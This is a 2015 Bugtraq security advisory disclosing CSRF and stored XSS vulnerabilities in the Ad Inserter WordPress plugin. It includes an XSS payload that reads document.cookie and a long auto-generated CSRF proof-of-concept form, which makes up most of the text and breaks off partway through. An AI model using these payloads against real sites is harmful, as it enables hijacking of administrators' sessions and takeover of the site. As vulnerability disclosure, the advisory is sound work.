
Date: Wed, 6 May 2015 19:44:24 GMT
From: kingkaustubh@...com
To: bugtraq@...urityfocus.com
Subject: CSRF/XSSIn Ad_InSerter Wordpress

================================================================
CSRF/Stored XSS Vulnerability in Ad Inserter Plugin 
================================================================


. contents:: Table Of Content

Overview
========

* Title :CSRF and Stored XSS Vulnerability in Ad Inserter Wordpress Plugin 
* Author: Kaustubh G. Padwad
* Plugin Homepage: https://wordpress.org/plugins/ad-inserter/
* Severity: HIGH
* Version Affected: Version  1.5.2  and mostly prior to it
* Version Tested : Version  1.5.2
* version patched:

Description 
===========

Vulnerable Parameter 
--------------------
* ad1_name
* Block 1
* Block Name
* adinserter name
* disable adinserter 


About Vulnerability
-------------------
This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin's browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc.

Vulnerability Class
=================== 
Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)

Steps to Reproduce: (POC)
=========================

After installing the plugin

1. Goto Dashboard --> Setting -->   Ad Inserter --> Block1

2. Insert this payload ## "> <img src="/" =_=" title="onerror='prompt(document.cookie)'"> ## Into  above mention Vulnerable parameter Save settings and see XSS in action

3. Visit Ad Inserter settings page of this plugin anytime later and you can see the script executing as it is stored.

Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below

CSRF POC Code
=============
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1/wp/wp-admin/options-general.php?page=ad-inserter.php" method="POST">
      <input type="hidden" name="ad&#95;save" value="Save&#32;All&#32;Settings" />
      <input type="hidden" name="ad1&#95;name" value="&lt;img&#32;src&#61;&quot;&#47;&quot;&#32;&#61;&#95;&#61;&quot;&#32;title&#61;&quot;onerror&#61;&apos;prompt&#40;document&#46;cookie&#41;&apos;&quot;&gt;" />
      <input type="hidden" name="ad1&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad1&#95;data" value="" />
      <input type="hidden" name="ad1&#95;displayType" value="None" />
      <input type="hidden" name="ad1&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad1&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad1&#95;floatType" value="None" />
      <input type="hidden" name="ad1&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad1&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad1&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad1&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad1&#95;block&#95;user" value="" />
      <input type="hidden" name="ad1&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad1&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad1&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad1&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad1&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad1&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad1&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad1&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad1&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad1&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad2&#95;name" value="Block&#32;2" />
      <input type="hidden" name="ad2&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad2&#95;data" value="" />
      <input type="hidden" name="ad2&#95;displayType" value="None" />
      <input type="hidden" name="ad2&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad2&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad2&#95;floatType" value="None" />
      <input type="hidden" name="ad2&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad2&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad2&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad2&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad2&#95;block&#95;user" value="" />
      <input type="hidden" name="ad2&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad2&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad2&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad2&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad2&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad2&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad2&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad2&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad2&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad2&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad3&#95;name" value="Block&#32;3" />
      <input type="hidden" name="ad3&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad3&#95;data" value="" />
      <input type="hidden" name="ad3&#95;displayType" value="None" />
      <input type="hidden" name="ad3&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad3&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad3&#95;floatType" value="None" />
      <input type="hidden" name="ad3&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad3&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad3&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad3&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad3&#95;block&#95;user" value="" />
      <input type="hidden" name="ad3&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad3&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad3&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad3&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad3&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad3&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad3&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad3&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad3&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad3&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad4&#95;name" value="Block&#32;4" />
      <input type="hidden" name="ad4&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad4&#95;data" value="" />
      <input type="hidden" name="ad4&#95;displayType" value="None" />
      <input type="hidden" name="ad4&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad4&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad4&#95;floatType" value="None" />
      <input type="hidden" name="ad4&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad4&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad4&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad4&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad4&#95;block&#95;user" value="" />
      <input type="hidden" name="ad4&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad4&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad4&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad4&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad4&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad4&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad4&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad4&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad4&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad4&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad5&#95;name" value="Block&#32;5" />
      <input type="hidden" name="ad5&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad5&#95;data" value="" />
      <input type="hidden" name="ad5&#95;displayType" value="None" />
      <input type="hidden" name="ad5&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad5&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad5&#95;floatType" value="None" />
      <input type="hidden" name="ad5&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad5&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad5&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad5&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad5&#95;block&#95;user" value="" />
      <input type="hidden" name="ad5&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad5&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad5&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad5&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad5&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad5&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad5&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad5&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad5&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad5&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad6&#95;name" value="Block&#32;6" />
      <input type="hidden" name="ad6&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad6&#95;data" value="" />
      <input type="hidden" name="ad6&#95;displayType" value="None" />
      <input type="hidden" name="ad6&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad6&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad6&#95;floatType" value="None" />
      <input type="hidden" name="ad6&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad6&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad6&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad6&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad6&#95;block&#95;user" value="" />
      <input type="hidden" name="ad6&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad6&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad6&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad6&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad6&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad6&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad6&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad6&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad6&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad6&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad7&#95;name" value="Block&#32;7" />
      <input type="hidden" name="ad7&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad7&#95;data" value="" />
      <input type="hidden" name="ad7&#95;displayType" value="None" />
      <input type="hidden" name="ad7&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad7&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad7&#95;floatType" value="None" />
      <input type="hidden" name="ad7&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad7&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad7&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad7&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad7&#95;block&#95;user" value="" />
      <input type="hidden" name="ad7&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad7&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad7&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad7&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad7&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad7&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad7&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad7&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad7&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad7&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad8&#95;name" value="Block&#32;8" />
      <input type="hidden" name="ad8&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad8&#95;data" value="" />
      <input type="hidden" name="ad8&#95;displayType" value="None" />
      <input type="hidden" name="ad8&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad8&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad8&#95;floatType" value="None" />
      <input type="hidden" name="ad8&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad8&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad8&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad8&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad8&#95;block&#95;user" value="" />
      <input type="hidden" name="ad8&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad8&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad8&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad8&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad8&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad8&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad8&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad8&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad8&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad8&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad9&#95;name" value="Block&#32;9" />
      <input type="hidden" name="ad9&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad9&#95;data" value="" />
      <input type="hidden" name="ad9&#95;displayType" value="None" />
      <input type="hidden" name="ad9&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad9&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad9&#95;floatType" value="None" />
      <input type="hidden" name="ad9&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad9&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad9&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad9&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad9&#95;block&#95;user" value="" />
      <input type="hidden" name="ad9&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad9&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad9&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad9&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad9&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad9&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad9&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad9&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad9&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad9&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad10&#95;name" value="Block&#32;10" />
      <input type="hidden" name="ad10&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad10&#95;data" value="" />
      <input type="hidden" name="ad10&#95;displayType" value="None" />
      <input type="hidden" name="ad10&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad10&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad10&#95;floatType" value="None" />
      <input type="hidden" name="ad10&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad10&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad10&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad10&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad10&#95;block&#95;user" value="" />
      <input type="hidden" name="ad10&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad10&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad10&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad10&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad10&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad10&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad10&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad10&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad10&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad10&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad11&#95;name" value="Block&#32;11" />
      <input type="hidden" name="ad11&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad11&#95;data" value="" />
      <input type="hidden" name="ad11&#95;displayType" value="None" />
      <input type="hidden" name="ad11&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad11&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad11&#95;floatType" value="None" />
      <input type="hidden" name="ad11&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad11&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad11&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad11&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad11&#95;block&#95;user" value="" />
      <input type="hidden" name="ad11&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad11&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad11&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad11&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad11&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad11&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad11&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad11&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad11&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad11&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad12&#95;name" value="Block&#32;12" />
      <input type="hidden" name="ad12&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad12&#95;data" value="" />
      <input type="hidden" name="ad12&#95;displayType" value="None" />
      <input type="hidden" name="ad12&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad12&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad12&#95;floatType" value="None" />
      <input type="hidden" name="ad12&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad12&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad12&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad12&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad12&#95;block&#95;user" value="" />
      <input type="hidden" name="ad12&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad12&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad12&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad12&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad12&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad12&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad12&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad12&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad12&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad12&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad13&#95;name" value="Block&#32;13" />
      <input type="hidden" name="ad13&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad13&#95;data" value="" />
      <input type="hidden" name="ad13&#95;displayType" value="None" />
      <input type="hidden" name="ad13&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad13&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad13&#95;floatType" value="None" />
      <input type="hidden" name="ad13&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;category" value="1" />
